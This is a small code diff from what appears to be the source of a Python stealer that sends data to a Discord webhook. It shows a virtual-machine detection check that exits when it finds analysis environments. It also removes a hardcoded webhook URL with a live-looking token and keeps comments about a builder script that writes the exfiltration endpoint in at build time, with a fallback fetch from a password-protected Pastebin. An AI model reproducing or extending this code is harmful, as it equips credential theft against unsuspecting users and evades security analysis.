@@ -337,7 +337,7 @@ def check_dll():
         exit_program('VM Detected')
 
 # Webhook URL — builder.pyw replaces the line below at build time.
-h00k = "https://discordapp.com/api/webhooks/1519042910644080661/ocU1bDtfeI6OTmvTbSHadul8DoBsajHSycHxpRv5fn9noDh5V6B7qouAxx2K8AUmzuIt"
+h00k = ""
 # builder.pyw rewrites h00k above — do not remove
 
 # Fetch webhook from password-protected Pastebin.
